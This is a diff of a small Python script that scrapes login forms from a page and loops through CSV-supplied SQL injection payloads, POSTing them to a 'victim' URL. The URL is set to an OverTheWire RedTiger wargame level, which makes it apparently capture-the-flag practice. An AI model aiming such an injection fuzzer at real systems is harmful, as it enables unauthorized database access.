@@ -2,12 +2,13 @@ from bs4 import BeautifulSoup
 import requests
 import re
 from Display import *
+from pull_from_CSV import *
 
 #searches html page for any potential forms 
 #generates and executes POST requests to the victim webserver
 def POST_generator():
-    
-    URL = "someURLEntry"
+
+    URL = "https://redtiger.labs.overthewire.org/level1.php"
     r = requests.get(URL)
     html_bytes = r.text
 
@@ -35,7 +36,14 @@ def POST_generator():
 
     print(form_inputs)
 
-    POST_send("pass arguments which are listed below")
+    #here we're going to loop and keep sending injection attempts to the POST_send function
+    for n in range(len(form_inputs)):
+        if (n + 1 < len(form_inputs)):
+            payload = pull_from_CSV()
+            for x,y in payload.items():
+                print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
+                POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
+                POST_send(URL, form_inputs[n], form_inputs[n+1], "' "+y, "' "+y)
 
 #Actually sends the POST request with the payload/information as specified 
 def POST_send(URL, username_field, password_field, username_input, password_input):
@@ -43,9 +51,8 @@ def POST_send(URL, username_field, password_field, username_input, password_inpu
     payload = {username_field: username_input, password_field : password_input}
     victim = URL
     r = requests.post(victim, payload)
-    print(r.text)
+    #print(r.text)
 
 if __name__ == "__main__" :
 
-    display_welcome()	
     POST_generator()
